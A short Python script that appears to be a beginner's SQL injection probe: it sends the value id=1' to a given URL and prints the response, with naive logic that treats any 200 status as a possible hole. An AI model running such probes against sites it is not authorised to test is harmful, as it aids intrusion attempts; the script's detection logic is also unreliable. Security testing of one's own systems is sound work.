import requests
from urllib.error import HTTPError
from urllib.request import urlopen
def sql_automate(url):
    target = url
    result = urlopen(target)
    if result.getcode() == 200:
        payload = {"id":"1'"}
        new_result = requests.get(target,payload)
        if new_result.status_code == 200:
            print(new_result.text)
        else:
            print("Exploit doesnt exists")

    else:
        print("ERRor while connecting to the website")
